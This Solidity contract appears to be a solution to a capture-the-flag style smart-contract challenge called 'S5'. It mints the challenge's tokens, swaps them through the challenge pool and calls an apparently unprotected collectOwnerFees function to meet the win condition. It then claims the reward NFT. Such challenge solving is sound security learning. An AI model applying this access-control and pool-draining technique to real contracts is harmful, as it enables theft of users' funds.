// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {IERC721Receiver} from
    "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/interfaces/IERC721Receiver.sol";
import {IERC721} from
    "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/interfaces/IERC721.sol";
import {IERC20} from
    "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/interfaces/IERC20.sol";

interface IS5 {
    function getPool() external view returns (address);
    function getTokenA() external view returns (address);
    function getTokenB() external view returns (address);
    function getTokenC() external view returns (address);
    function solveChallenge(string memory twitterHandle) external;
}

interface IS5Pool {
    function swapFrom(IERC20 tokenFrom, IERC20 tokenTo, uint256 amount) external;
    function collectOwnerFees(IERC20 token) external;
}

interface IS5Token is IERC20 {
    function mint(address to) external;
}

contract SolveS5 is IERC721Receiver {
    address public constant NFT_ADDRESS = 0x31801c3e09708549c1b2c9E1CFbF001399a1B9fa;
    address public constant S5_CHALLENGE_ADDRESS = 0xdeB8d8eFeF7049E280Af1d5FE3a380F3BE93B648;

    IS5 public immutable i_s5Challenge;
    IS5Pool public immutable i_s5Pool;
    IS5Token public immutable i_tokenA;
    IS5Token public immutable i_tokenB;
    IS5Token public immutable i_tokenC;

    string public s_twitterHandle;

    uint256 private s_tokenId;

    constructor(string memory twitterHandle) {
        i_s5Challenge = IS5(S5_CHALLENGE_ADDRESS);
        i_s5Pool = IS5Pool(i_s5Challenge.getPool());
        i_tokenA = IS5Token(i_s5Challenge.getTokenA());
        i_tokenB = IS5Token(i_s5Challenge.getTokenB());
        i_tokenC = IS5Token(i_s5Challenge.getTokenC());
        s_twitterHandle = twitterHandle;
    }

    function mintTokens() public {
        i_tokenA.mint(address(this));
        i_tokenB.mint(address(this));
        i_tokenC.mint(address(this));
    }

    function solveChallenge() external {
        mintTokens();
        i_tokenA.approve(address(i_s5Pool), type(uint256).max);
        i_tokenB.approve(address(i_s5Pool), type(uint256).max);
        i_tokenC.approve(address(i_s5Pool), type(uint256).max);
        i_s5Pool.swapFrom(i_tokenA, i_tokenB, i_tokenA.balanceOf(address(this)));
        i_s5Pool.collectOwnerFees(i_tokenA);

        i_s5Challenge.solveChallenge(s_twitterHandle);
    }

    function claimNFT() public {
        uint256 tokenId = s_tokenId;
        IERC721(NFT_ADDRESS).approve(address(this), tokenId);
        IERC721(NFT_ADDRESS).safeTransferFrom(address(this), msg.sender, tokenId, "0x");
    }

    function onERC721Received(address, /* operator */ address, /* from */ uint256 tokenId, bytes calldata /* data */ )
        external
        returns (bytes4)
    {
        s_tokenId = tokenId;
        return this.onERC721Received.selector;
    }
}
